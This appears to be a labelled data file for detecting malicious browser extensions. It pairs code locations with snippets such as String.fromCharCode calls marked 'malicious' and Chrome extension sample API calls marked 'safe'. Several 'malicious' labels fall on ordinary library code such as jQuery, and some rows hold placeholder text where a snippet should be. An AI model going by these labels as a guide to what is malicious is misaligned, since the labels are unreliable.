JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jqueryui.js,8,String.fromCharCode,String.fromCharCode argument: null==e ... harCode,String. ... arCode),malicious,others,String.fromCharCode(null==e.charCode?e.keyCode:e.charCode)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,2470,String.fromCharCode,String.fromCharCode argument: code,String. ... e(code),malicious,others,String.fromCharCode(code)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-vendors.81072308.js,13682,String.fromCharCode,String.fromCharCode argument: code,String. ... e(code),malicious,others,String.fromCharCode(code)
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/lib/jquery/jquery-3.4.1.js,661,String.fromCharCode,String.fromCharCode argument: high + 0x10000,String. ... 10000 ),malicious,others,String.fromCharCode( high + 0x10000 )
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/lib/jquery/jquery-3.4.1.js,663,String.fromCharCode,String.fromCharCode argument: high >> 10 | 0xD800,String. ... xDC00 ),malicious,others,"String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 )"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/18/18.js,2,String.fromCharCode,String.fromCharCode argument: e,String. ... Code(e),malicious,others,String.fromCharCode(e)
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/18/18.js,2,String.fromCharCode,String.fromCharCode argument: 32,String. ... ode(32),malicious,others,String.fromCharCode(32)
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/18/18.js,2,String.fromCharCode,String.fromCharCode argument: n.which,String. ... .which),malicious,others,String.fromCharCode(n.which)
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/313/313.js,2,String.fromCharCode,String.fromCharCode argument: t+(t>25?39:97),String. ... 39:97)),malicious,others,String.fromCharCode(t+(t>25?39:97))
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/893/893.js,1,String.fromCharCode,String.fromCharCode argument: t+(t>25?39:97),String. ... 39:97)),malicious,others,String.fromCharCode(t+(t>25?39:97))
api-samples/action/background.js,9,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'demo/index.html' })
api-samples/action/demo/index.js,76,chrome.tabs.create,chrome. ... om/' }),safe,chrome,chrome.tabs.create({ url: 'https://html5zombo.com/' })
api-samples/action/demo/index.js,248,chrome.runtime.getURL,chrome. ... jiFile),safe,chrome,chrome.runtime.getURL(emojiFile)
api-samples/action/demo/index.js,260,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
api-samples/action/demo/index.js,282,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
api-samples/action/demo/index.js,296,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
api-samples/alarms/background.js,16,chrome.alarms.create,chrome. ... 1\r\n  }),safe,chrome,"chrome.alarms.create('demo-default-alarm', { delayInMinutes: 1, periodInMinutes: 1 })"
api-samples/alarms/background.js,25,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'index.html' })
api-samples/alarms/index.js,96,chrome.alarms.clear,chrome. ... \n    }),safe,chrome,"chrome.alarms.clear(name, (wasCleared) => { if (wasCleared) { this.logMessage(`Manager: canceled alarm ""${name}""`); } else { this.logMessage(`Manager: could not canceled alarm ""${name}""`); } })"
api-samples/alarms/index.js,107,chrome.alarms.create,chrome. ... rmInfo),safe,chrome,"chrome.alarms.create(name, alarmInfo)"
api-samples/alarms/index.js,128,chrome.alarms.clearAll,chrome. ... \n    }),safe,chrome,"chrome.alarms.clearAll((wasCleared) => { if (wasCleared) { this.logMessage(`Manager: canceled all alarms""`); } else { this.logMessage(`Manager: could not canceled all alarms`); } })"
api-samples/alarms/index.js,138,chrome.alarms.getAll,chrome. ... \n    }),safe,chrome,"chrome.alarms.getAll((alarms) => { for (const [index, alarm] of alarms.entries()) { const isLast = index === alarms.length - 1; this.renderAlarm(alarm, isLast); } })"
api-samples/bookmarks/popup.js,17,chrome.bookmarks.getTree,chrome. ... t);\r\n}),safe,chrome,"chrome.bookmarks.getTree((tree) => { const bookmarkList = document.getElementById('bookmarkList'); displayBookmarks(tree[0].children, bookmarkList); })"
api-samples/bookmarks/popup.js,43,chrome.bookmarks.create,chrome. ...  }\r\n  ),safe,chrome,"chrome.bookmarks.create( { title: 'Google', url: 'https://www.google.com' }, () => { console.log('Bookmark added'); location.reload(); // Refresh the popup } )"
api-samples/bookmarks/popup.js,57,chrome.bookmarks.search,chrome. ... ;\r\n  }),safe,chrome,"chrome.bookmarks.search({ url: 'https://www.google.com/' }, (results) => { for (const result of results) { if (result.url === 'https://www.google.com/') { chrome.bookmarks.remove(result.id, () => {}); } } location.reload(); })"
api-samples/bookmarks/popup.js,60,chrome.bookmarks.remove,chrome. ...  => {}),safe,chrome,"chrome.bookmarks.remove(result.id, () => {})"
api-samples/contentSettings/popup.js,34,chrome.tabs.query,chrome. ... ;\r\n  }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) { let current = tabs[0]; incognito = current.incognito; url = current.url; let types = [ 'cookies', 'images', 'javascript', 'location', 'popups', 'notifications', 'microphone', 'camera', 'automaticDownloads' ]; types.forEach(function (type) { // HACK: [type] is not recognised by the docserver's sample crawler, so // mention an explicit // type: chrome.contentSettings.cookies.get - See http://crbug.com/299634 chrome.contentSettings[type] && chrome.contentSettings[type].get( { primaryUrl: url, incognito: incognito }, function (details) { document.getElementById(type).disabled = false; document.getElementById(type).value = details.setting; } ); }); })"
api-samples/contextMenus/global_context_search/background.js,27,chrome.tabs.create,chrome. ...  + 1 }),safe,chrome,"chrome.tabs.create({ url: url.href, index: tab.index + 1 })"
api-samples/cookies/cookie-clearer/popup.js,7,chrome.tabs.query,chrome. ... true }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
api-samples/cookies/cookie-clearer/popup.js,58,chrome.cookies.getAll,chrome. ... main }),safe,chrome,chrome.cookies.getAll({ domain })
api-samples/cookies/cookie-clearer/popup.js,92,chrome.cookies.remove,chrome. ... d\r\n  }),safe,chrome,"chrome.cookies.remove({ url: cookieUrl, name: cookie.name, storeId: cookie.storeId })"
api-samples/default_command_override/background.js,5,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ currentWindow: true })
api-samples/default_command_override/background.js,20,chrome.tabs.update,chrome. ... true }),safe,chrome,"chrome.tabs.update(tabs[newIndex].id, { active: true, highlighted: true })"
api-samples/favicon/popup.js,2,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
api-samples/history/historyOverride/logic.js,6,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
api-samples/history/historyOverride/logic.js,36,chrome.history.deleteUrl,chrome. ... .url }),safe,chrome,chrome.history.deleteUrl({ url: item.url })
api-samples/history/historyOverride/logic.js,57,chrome.history.search,chrome. ... o\r\n  }),safe,chrome,"chrome.history.search({ text: searchQuery, startTime: kOneWeekAgo })"
api-samples/history/historyOverride/logic.js,68,chrome.history.deleteUrl,chrome. ... alue }),safe,chrome,chrome.history.deleteUrl({ url: checkbox.value })
api-samples/history/historyOverride/logic.js,75,chrome.history.deleteAll,chrome. ... teAll(),safe,chrome,chrome.history.deleteAll()
api-samples/history/historyOverride/logic.js,79,chrome.history.search,chrome. ... 9\r\n  }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/history/showHistory/popup.js,18,chrome.tabs.create,chrome. ... f\r\n  }),safe,chrome,"chrome.tabs.create({ selected: true, url: event.srcElement.href })"
api-samples/history/showHistory/popup.js,58,chrome.history.search,chrome. ...  }\r\n  ),safe,chrome,"chrome.history.search( { text: '', // Return every history item.... startTime: oneWeekAgo // that was accessed less than one week ago. }, function (historyItems) { // For each history item, get details on all visits. for (let i = 0; i < historyItems.length; ++i) { let url = historyItems[i].url; let processVisitsWithUrl = function (url) { // We need the url of the visited item to process the visit. // Use a closure to bind the  url into the callback's args. return function (visitItems) { processVisits(url, visitItems); }; }; chrome.history.getVisits({ url: url }, processVisitsWithUrl(url)); numRequestsOutstanding++; } if (!numRequestsOutstanding) { onAllVisitsProcessed(); } } )"
api-samples/history/showHistory/popup.js,74,chrome.history.getVisits,chrome. ... l(url)),safe,chrome,"chrome.history.getVisits({ url: url }, processVisitsWithUrl(url))"
api-samples/identity/identity.js,42,chrome.identity.getProfileUserInfo,chrome. ... .ANY }),safe,chrome,chrome.identity.getProfileUserInfo()
api-samples/identity/identity.js,92,chrome.identity.getAuthToken,chrome. ... tive }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/identity/identity.js,112,chrome.identity.removeCachedAuthToken,chrome. ... oken }),safe,chrome,chrome.identity.removeCachedAuthToken({ token: current_token.token })
api-samples/identity/identity.js,183,chrome.identity.getAuthToken,chrome. ... true }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/identity/identity.js,197,chrome.identity.getAuthToken,chrome. ... alse }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/identity/identity.js,201,chrome.identity.removeCachedAuthToken,chrome. ... oken }),safe,chrome,chrome.identity.removeCachedAuthToken({ token: current_token.token })
api-samples/identity/main.js,2,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,"chrome.tabs.create({ active: true, url: 'index.html' })"
api-samples/nativeMessaging/extension/main.js,43,chrome.runtime.connectNative,chrome. ... stName),safe,chrome,chrome.runtime.connectNative(hostName)
api-samples/omnibox/new-tab-search/background.js,9,chrome.tabs.create,chrome. ... wURL }),safe,chrome,chrome.tabs.create({ url: newURL })
api-samples/omnibox/simple-example/service-worker.js,2,chrome.runtime.sendMessage,chrome. ... text }),safe,chrome,"chrome.runtime.sendMessage({ type: 'append-log', text })"
api-samples/omnibox/simple-example/service-worker.js,6,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'logs.html' })
api-samples/printing/background.js,16,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'printers.html' })
api-samples/readingList/sw.js,18,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'index.html' })
api-samples/richNotification/popup.js,27,chrome.notifications.create,chrome. ... ptions),safe,chrome,chrome.notifications.create(options)
api-samples/richNotification/popup.js,38,chrome.notifications.create,chrome. ... ptions),safe,chrome,chrome.notifications.create(options)
api-samples/richNotification/popup.js,52,chrome.notifications.create,chrome. ... ptions),safe,chrome,chrome.notifications.create(options)
api-samples/sandbox/sandbox/service-worker.js,22,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'mainpage.html' })
api-samples/sandbox/sandboxed-content/service-worker.js,22,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'main.html' })
api-samples/scripting/index.js,18,chrome.scripting.getRegisteredContentScripts,chrome. ... ripts(),safe,chrome,chrome.scripting.getRegisteredContentScripts()
api-samples/scripting/index.js,30,chrome.scripting.unregisterContentScripts,chrome. ...      }),safe,chrome,chrome.scripting.unregisterContentScripts({ ids: [DYNAMIC_SCRIPT_ID] })
api-samples/scripting/index.js,38,chrome.runtime.sendMessage,chrome. ... \n    }),safe,chrome,"chrome.runtime.sendMessage({ name: 'inject-programmatic', options: { world } })"
api-samples/scripting/index.js,55,chrome.scripting.registerContentScripts,chrome. ... \n    ]),safe,chrome,"chrome.scripting.registerContentScripts([ { id: DYNAMIC_SCRIPT_ID, js: ['content-script.js'], persistAcrossSessions, matches: [matches], runAt, allFrames, world } ])"
api-samples/scripting/index.js,69,chrome.tabs.create,chrome. ... com' }),safe,chrome,chrome.tabs.create({ url: 'https://example.com' })
api-samples/scripting/index.js,78,chrome.scripting.unregisterContentScripts,chrome. ... \n    }),safe,chrome,chrome.scripting.unregisterContentScripts({ ids: [DYNAMIC_SCRIPT_ID] })
api-samples/scripting/sw.js,18,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'index.html' })
api-samples/scripting/sw.js,24,chrome.scripting.executeScript,chrome. ... s\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId }, files: ['content-script.js'], ...options })"
api-samples/scripting/sw.js,34,chrome.tabs.create,chrome. ... \n    }),safe,chrome,chrome.tabs.create({ url: 'https://example.com/#inject-programmatic' })
api-samples/storage/stylizr/popup.js,10,chrome.tabs.query,chrome. ... \n    }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
api-samples/storage/stylizr/popup.js,15,chrome.scripting.insertCSS,chrome. ...      }),safe,chrome,"chrome.scripting.insertCSS({ css: items.css, target: { tabId: currentTab.id } })"
api-samples/storage/stylizr/popup.js,27,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('options.html')
api-samples/tabCapture/service-worker.js,2,chrome.tabs.query,chrome. ... )\r\n  }),safe,chrome,chrome.tabs.query({ url: chrome.runtime.getURL('receiver.html') })
api-samples/tabCapture/service-worker.js,3,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('receiver.html')
api-samples/tabCapture/service-worker.js,6,chrome.tabs.remove,chrome. ... tab.id),safe,chrome,chrome.tabs.remove(tab.id)
api-samples/tabCapture/service-worker.js,16,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('receiver.html')
api-samples/tabCapture/service-worker.js,32,chrome.tabs.sendMessage,chrome. ... d\r\n  }),safe,chrome,"chrome.tabs.sendMessage(receiverTabId, { targetTabId: currentTabId, consumerTabId: receiverTabId })"
api-samples/tabs/inspector/service-worker.js,2,chrome.tabs.create,chrome. ... )\r\n  }),safe,chrome,chrome.tabs.create({ url: chrome.runtime.getURL('window_and_tabs_manager.html') })
api-samples/tabs/inspector/service-worker.js,3,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('window_and_tabs_manager.html')
api-samples/tabs/inspector/window_and_tabs_manager.js,140,chrome.tabs.update,chrome. ... tive }),safe,chrome,"chrome.tabs.update(tabId, { active })"
api-samples/tabs/inspector/window_and_tabs_manager.js,155,chrome.tabs.update,chrome. ... ta(id)),safe,chrome,"chrome.tabs.update(id, updateTabData(id))"
api-samples/tabs/inspector/window_and_tabs_manager.js,169,chrome.tabs.move,chrome. ... ta(id)),safe,chrome,"chrome.tabs.move(id, moveTabData(id))"
api-samples/tabs/inspector/window_and_tabs_manager.js,186,chrome.tabs.create,chrome. ... e(args),safe,chrome,chrome.tabs.create(args)
api-samples/tabs/inspector/window_and_tabs_manager.js,196,chrome.tabs.update,chrome. ... ds[i])),safe,chrome,"chrome.tabs.update(tabIds[i], updateTabData(tabIds[i]))"
api-samples/tabs/inspector/window_and_tabs_manager.js,207,chrome.tabs.move,chrome. ... ds[i])),safe,chrome,"chrome.tabs.move(tabIds[i], moveTabData(tabIds[i]))"
api-samples/tabs/inspector/window_and_tabs_manager.js,215,chrome.tabs.remove,chrome. ... (tabId),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/tabs/inspector/window_and_tabs_manager.js,297,chrome.tabs.get,chrome. ... (tabId),safe,chrome,chrome.tabs.get(tabId)
api-samples/tabs/inspector/window_and_tabs_manager.js,364,chrome.tabs.query,chrome. ... owId }),safe,chrome,chrome.tabs.query({ windowId })
api-samples/tabs/inspector/window_and_tabs_manager.js,400,chrome.tabs.query,chrome. ... owId }),safe,chrome,"chrome.tabs.query({ active: true, windowId })"
api-samples/tabs/pin/service-worker.js,4,chrome.tabs.query,chrome. ... true }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
api-samples/tabs/pin/service-worker.js,7,chrome.tabs.update,chrome. ... nned }),safe,chrome,"chrome.tabs.update(current.id, { pinned: !current.pinned })"
api-samples/tabs/screenshot/service-worker.js,3,chrome.tabs.captureVisibleTab,chrome. ... leTab(),safe,chrome,chrome.tabs.captureVisibleTab()
api-samples/tabs/screenshot/service-worker.js,4,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('screenshot.html')
api-samples/tabs/screenshot/service-worker.js,19,chrome.tabs.sendMessage,chrome. ... tUrl }),safe,chrome,"chrome.tabs.sendMessage(tabId, { msg: 'screenshot', data: screenshotUrl })"
api-samples/tabs/screenshot/service-worker.js,22,chrome.tabs.create,chrome. ... bUrl }),safe,chrome,chrome.tabs.create({ url: viewTabUrl })
api-samples/tabs/zoom/popup.js,30,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ active: true })
api-samples/tabs/zoom/popup.js,37,chrome.tabs.getZoomSettings,chrome. ... (tabId),safe,chrome,chrome.tabs.getZoomSettings(tabId)
api-samples/tabs/zoom/popup.js,53,chrome.tabs.getZoom,chrome. ... (tabId),safe,chrome,chrome.tabs.getZoom(tabId)
api-samples/tabs/zoom/popup.js,76,chrome.tabs.getZoom,chrome. ... (tabId),safe,chrome,chrome.tabs.getZoom(tabId)
api-samples/tabs/zoom/popup.js,78,chrome.tabs.setZoom,chrome. ... Factor),safe,chrome,"chrome.tabs.setZoom(tabId, newZoomFactor)"
api-samples/tabs/zoom/popup.js,92,chrome.tabs.setZoom,"chrome. ... bId, 0)",safe,chrome,"chrome.tabs.setZoom(tabId, 0)"
api-samples/tabs/zoom/popup.js,117,chrome.tabs.setZoomSettings,chrome. ... eVal }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/topSites/basic/popup.js,4,chrome.tabs.create,chrome. ... href }),safe,chrome,chrome.tabs.create({ url: event.target.href })
api-samples/topSites/magic8ball/newTab.js,16,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
api-samples/userScripts/sw.js,17,chrome.runtime.openOptionsPage,chrome. ... sPage(),safe,chrome,chrome.runtime.openOptionsPage()
api-samples/userScripts/sw.js,22,chrome.runtime.openOptionsPage,chrome. ... sPage(),safe,chrome,chrome.runtime.openOptionsPage()
api-samples/web-accessible-resources/content-script.js,12,chrome.runtime.getURL,chrome. ... }.png`),safe,chrome,chrome.runtime.getURL(`${id}.png`)
api-samples/web-accessible-resources/service-worker.js,12,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: '/index.html' })
api-samples/webNavigation/basic/service-worker.js,16,chrome.notifications.create,chrome. ... '\r\n  }),safe,chrome,"chrome.notifications.create({ type: 'basic', iconUrl: 'icon.png', title: 'page loaded', message: 'Completed loading: ' + details.url + ' at ' + details.timeStamp + ' milliseconds since the epoch.' })"
api-samples/windows/background.js,18,chrome.tabs.query,chrome. ... ery({}),safe,chrome,chrome.tabs.query({})
api-samples/windows/background.js,21,chrome.tabs.move,chrome. ...      }),safe,chrome,"chrome.tabs.move(tab.id, { windowId: current.id, index: tab.index })"
functional-samples/ai.gemini-on-device-summarization/background.js,13,chrome.tabs.get,chrome. ... (tabId),safe,chrome,chrome.tabs.get(tabId)
functional-samples/ai.gemini-on-device-summarization/background.js,17,chrome.scripting.executeScript,chrome. ... ]\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId }, files: ['scripts/extract-content.js'] })"
functional-samples/cookbook.geolocation-offscreen/service_worker.js,29,chrome.runtime.getURL,chrome. ... T_PATH),safe,chrome,chrome.runtime.getURL(OFFSCREEN_DOCUMENT_PATH)
functional-samples/cookbook.geolocation-offscreen/service_worker.js,58,chrome.runtime.sendMessage,chrome. ... '\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type: 'get-geolocation', target: 'offscreen' })"
functional-samples/cookbook.offscreen-clipboard-write/background.js,37,chrome.runtime.sendMessage,chrome. ... e\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type: 'copy-data-to-clipboard', target: 'offscreen-doc', data: value })"
functional-samples/cookbook.offscreen-dom/background.js,35,chrome.runtime.sendMessage,chrome. ... a\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type, target: 'offscreen', data })"
functional-samples/cookbook.offscreen-dom/offscreen.js,52,chrome.runtime.sendMessage,chrome. ... a\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type, target: 'background', data })"
functional-samples/cookbook.sidepanel-open/content-script.js,6,chrome.runtime.sendMessage,chrome. ... nel' }),safe,chrome,chrome.runtime.sendMessage({ type: 'open_side_panel' })
functional-samples/cookbook.sidepanel-open/script.js,2,chrome.tabs.query,chrome. ... rue\r\n}),safe,chrome,"chrome.tabs.query({ active: true, lastFocusedWindow: true })"
functional-samples/cookbook.sidepanel-open/service-worker.js,21,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'page.html' })
functional-samples/reference.mv3-content-scripts/popup.js,6,chrome.tabs.query,chrome. ... ptions),safe,chrome,chrome.tabs.query(queryOptions)
functional-samples/reference.mv3-content-scripts/popup.js,13,chrome.scripting.executeScript,chrome. ... ]\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, files: ['content-script.js'] })"
functional-samples/reference.mv3-content-scripts/popup.js,27,chrome.scripting.executeScript,chrome. ... ]\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, func: showAlert, args: [name] })"
functional-samples/sample.bookmarks/popup.js,15,chrome.bookmarks.getTree,chrome. ... ;\r\n  }),safe,chrome,"chrome.bookmarks.getTree(function (bookmarkTreeNodes) { $('#bookmarks').append(dumpTreeNodes(bookmarkTreeNodes, query)); })"
functional-samples/sample.bookmarks/popup.js,62,chrome.tabs.create,chrome. ... .url }),safe,chrome,chrome.tabs.create({ url: bookmarkNode.url })
functional-samples/sample.bookmarks/popup.js,102,chrome.bookmarks.remove,chrome. ... de.id)),safe,chrome,chrome.bookmarks.remove(String(bookmarkNode.id))
functional-samples/sample.bookmarks/popup.js,132,chrome.bookmarks.create,chrome. ...      }),safe,chrome,"chrome.bookmarks.create({ parentId: bookmarkNode.id, title: $('#title').val(), url: $('#url').val() })"
functional-samples/sample.bookmarks/popup.js,169,chrome.bookmarks.update,chrome. ...      }),safe,chrome,"chrome.bookmarks.update(String(bookmarkNode.id), { title: edit.val() })"
functional-samples/sample.co2meter/co2-state-iframe.js,26,chrome.runtime.connect,chrome. ... nnect(),safe,chrome,chrome.runtime.connect()
functional-samples/sample.co2meter/modules/co2_meter.js,127,chrome.runtime.sendMessage,chrome. ... ESSAGE),safe,chrome,chrome.runtime.sendMessage(PERMISSION_GRANTED_MESSAGE)
functional-samples/sample.dnr-rule-manager/manager.js,7,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/manager.js,12,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/manager.js,28,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/manager.js,126,chrome.declarativeNetRequest.isRegexSupported,chrome. ... \n    }),safe,chrome,"chrome.declarativeNetRequest.isRegexSupported({ isCaseSensitive: caseSensitive, regex: conditionValue })"
functional-samples/sample.dnr-rule-manager/manager.js,162,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... ]\r\n  }),safe,chrome,"chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [id], addRules: [ { id, action: { type: 'modifyHeaders', requestHeaders: [ { header: 'cookie', operation: 'remove' } ] }, condition: { [conditionType]: conditionValue, isUrlFilterCaseSensitive: caseSensitive, resourceTypes: ['main_frame', 'xmlhttprequest'] } } ] })"
functional-samples/sample.dnr-rule-manager/manager.js,187,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... ]\r\n  }),safe,chrome,chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [id] })
functional-samples/sample.dnr-rule-manager/popup.js,2,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'manager.html' })
functional-samples/sample.dnr-rule-manager/popup.js,8,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ active: true })
functional-samples/sample.dnr-rule-manager/popup.js,9,chrome.declarativeNetRequest.getMatchedRules,chrome. ... abId }),safe,chrome,chrome.declarativeNetRequest.getMatchedRules({ tabId })
functional-samples/sample.dnr-rule-manager/service_worker.js,3,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/service_worker.js,4,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... ]\r\n  }),safe,chrome,"chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: existingRules.map((rule) => rule.id), addRules: [ { id: 1, action: { type: 'modifyHeaders', requestHeaders: [ { header: 'cookie', operation: 'remove' } ] }, condition: { urlFilter: '|*?no-cookies=1', resourceTypes: ['main_frame', 'xmlhttprequest'] } }, { id: 2, action: { type: 'modifyHeaders', requestHeaders: [ { header: 'cookie', operation: 'remove' } ] }, condition: { regexFilter: '.*\\.google\\.com', resourceTypes: ['main_frame', 'xmlhttprequest'] } } ] })"
functional-samples/sample.dnr-rule-manager/service_worker.js,43,chrome.declarativeNetRequest.setExtensionActionOptions,chrome. ... rue\r\n}),safe,chrome,chrome.declarativeNetRequest.setExtensionActionOptions({ displayActionCountAsBadgeText: true })
functional-samples/sample.favicon-cs/content.js,2,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
functional-samples/sample.milestones/popup.js,15,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ active: true })
functional-samples/sample.page-redder/service-worker.js,7,chrome.scripting.executeScript,chrome. ... \n    }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, function: reddenPage })"
functional-samples/sample.tabcapture-recorder/service-worker.js,16,chrome.runtime.getContexts,chrome. ... xts({}),safe,chrome,chrome.runtime.getContexts({})
functional-samples/sample.tabcapture-recorder/service-worker.js,36,chrome.runtime.sendMessage,chrome. ... \n    }),safe,chrome,"chrome.runtime.sendMessage({ type: 'stop-recording', target: 'offscreen' })"
functional-samples/sample.tabcapture-recorder/service-worker.js,50,chrome.runtime.sendMessage,chrome. ... d\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type: 'start-recording', target: 'offscreen', data: streamId })"
functional-samples/sample.water_alarm_notification/background.js,8,chrome.notifications.create,chrome. ... 0\r\n  }),safe,chrome,"chrome.notifications.create({ type: 'basic', iconUrl: 'stay_hydrated.png', title: 'Time to Hydrate', message: ""Everyday I'm Guzzlin'!"", buttons: [{ title: 'Keep it Flowing.' }], priority: 0 })"
functional-samples/sample.water_alarm_notification/background.js,21,chrome.alarms.create,chrome. ... utes }),safe,chrome,chrome.alarms.create({ delayInMinutes: item.minutes })
functional-samples/sample.water_alarm_notification/popup.js,9,chrome.alarms.create,chrome. ... utes }),safe,chrome,chrome.alarms.create({ delayInMinutes: minutes })
functional-samples/sample.water_alarm_notification/popup.js,16,chrome.alarms.clearAll,chrome. ... arAll(),safe,chrome,chrome.alarms.clearAll()
functional-samples/sample.webgpu/service-worker.js,42,chrome.tabs.create,chrome. ... sult }),safe,chrome,chrome.tabs.create({ url: reader.result })
functional-samples/tutorial.broken-color/popup.js,27,chrome.tabs.query,chrome. ... ;\r\n  }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => { // Use the Scripting API to execute a script chrome.scripting.executeScript({ target: { tabId: tabs[0].id }, args: [color], func: setColor }); })"
functional-samples/tutorial.broken-color/popup.js,29,chrome.scripting.executeScript,chrome. ... \n    }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tabs[0].id }, args: [color], func: setColor })"
functional-samples/tutorial.custom-cursor/counter.js,2,chrome.runtime.sendMessage,chrome. ... click'),safe,chrome,chrome.runtime.sendMessage('page-click')
functional-samples/tutorial.focus-mode/background.js,40,chrome.scripting.insertCSS,chrome. ...      }),safe,chrome,"chrome.scripting.insertCSS({ files: ['focus-mode.css'], target: { tabId: tab.id } })"
functional-samples/tutorial.focus-mode/background.js,46,chrome.scripting.removeCSS,chrome. ...      }),safe,chrome,"chrome.scripting.removeCSS({ files: ['focus-mode.css'], target: { tabId: tab.id } })"
functional-samples/tutorial.focus-mode-debugging/background.js,39,chrome.tabs.sendMessage,chrome. ... -on' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-on' })"
functional-samples/tutorial.focus-mode-debugging/background.js,41,chrome.tabs.sendMessage,chrome. ... off' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-off' })"
functional-samples/tutorial.focus-mode-debugging/fixed/background.js,39,chrome.tabs.sendMessage,chrome. ... -on' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-on' })"
functional-samples/tutorial.focus-mode-debugging/fixed/background.js,41,chrome.tabs.sendMessage,chrome. ... off' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-off' })"
functional-samples/tutorial.getting-started/popup.js,10,chrome.tabs.query,chrome. ... true }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
